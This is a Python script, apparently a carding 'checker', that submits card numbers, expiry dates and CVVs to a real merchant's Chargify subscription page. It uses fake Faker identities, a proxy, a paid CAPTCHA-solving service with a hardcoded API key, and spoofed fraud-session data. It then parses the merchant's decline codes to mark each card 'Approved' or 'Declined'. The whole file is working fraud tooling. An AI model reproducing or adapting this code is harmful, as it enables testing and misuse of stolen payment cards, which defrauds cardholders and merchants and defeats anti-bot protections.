import base64
import capsolver
import asyncio
import uuid
from httpx import AsyncClient
from faker import Faker


async def chargify(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(proxies=proxyg,verify=False) as web:
        
        capsolver.api_key = "CAP-7FDEBEE009A2807063AFDF5FCE50B716"
        
        email = str(uuid.uuid4()) + '@gmail.com'
        
        fake = Faker()
        
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6Lf1ibYqAAAAAPXWN_NwppS3dG2CPPeSfvT1vuxl',
        "websiteURL": 'https://nativeadbuzz.chargifypay.com/subscribe/yswg9z8fcz5b/nab_basic',
        })))['gRecaptchaResponse']
        
        req1 = await web.get('https://nativeadbuzz.chargifypay.com/subscribe/yswg9z8fcz5b/nab_basic')
        
        csrf_token = req1.text.split('name="csrf-token" content="')[1].split('"')[0]
        
        uniqueness_token = req1.text.split('name="uniqueness_token" id="uniqueness_token" value="')[1].split('"')[0]
        
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://nativeadbuzz.chargifypay.com',
            'Referer': 'https://nativeadbuzz.chargifypay.com/subscribe/yswg9z8fcz5b/nab_basic',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        params = {
            'with_chargify_js': 'false',
        }

        data = {
            'utf8': '✓',
            'authenticity_token': csrf_token,
            'uniqueness_token': uniqueness_token,
            'product_id': '3735178',
            'token': 'yswg9z8fcz5b',
            'subscription[coupon_code]': '',
            'subscription[payment_profile_attributes][payment_method]': 'credit_card',
            'subscription[customer_attributes][reference]': '',
            'subscription[customer_attributes][locale]': '',
            'subscription[customer_attributes][first_name]': fake.first_name(),
            'subscription[customer_attributes][last_name]': fake.last_name(),
            'subscription[customer_attributes][email]': email,
            'subscription[customer_attributes][phone]': fake.phone_number(),
            'subscription[customer_attributes][organization]': fake.company(),
            'subscription[payment_profile_attributes][device_data]': '{"device_session_id":"e9710ec7a8a970dfc47e6cd4fc0b6681","fraud_merchant_id":null,"correlation_id":"75db80fbf775d80123149abb30a7fce3"}',
            'fraud_env': 'production',
            'subscription[payment_profile_attributes][first_name]': fake.first_name(),
            'subscription[payment_profile_attributes][last_name]': fake.last_name(),
            'subscription[payment_profile_attributes][full_number]': cc,
            'subscription[payment_profile_attributes][cvv]': cvv,
            'subscription[payment_profile_attributes][expiration_month]': mes,
            'subscription[payment_profile_attributes][expiration_year]': ano,
            'subscription[payment_profile_attributes][billing_address]': fake.address(),
            'subscription[payment_profile_attributes][billing_address_2]': '',
            'subscription[payment_profile_attributes][billing_country]': 'US',
            'subscription[payment_profile_attributes][billing_city]': fake.city(),
            'subscription[payment_profile_attributes][billing_state]': fake.state(),
            'subscription[payment_profile_attributes][billing_zip]': fake.zipcode(),
            'g-recaptcha-response': g_response,
            'subscription[agree_to_terms]': [
                '0',
                '1',
            ],
        }

        req3 = await web.post('https://nativeadbuzz.chargifypay.com/subscribe/yswg9z8fcz5b/nab_basic',params=params,headers=headers,data=data,)
        if 'Thank You' in req3.text:
            status = "Approved ✅"
            mensaje = "Charged $7.00"
        else:
            mensaje = req3.text.split('<div class="content__alert--danger" role="alert">')[1].split('</div>')[0]
            if "1000" in mensaje:
                status = "Approved ✅"
            elif "2010" in mensaje:
                status = "Approved ✅"
            elif "2001" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje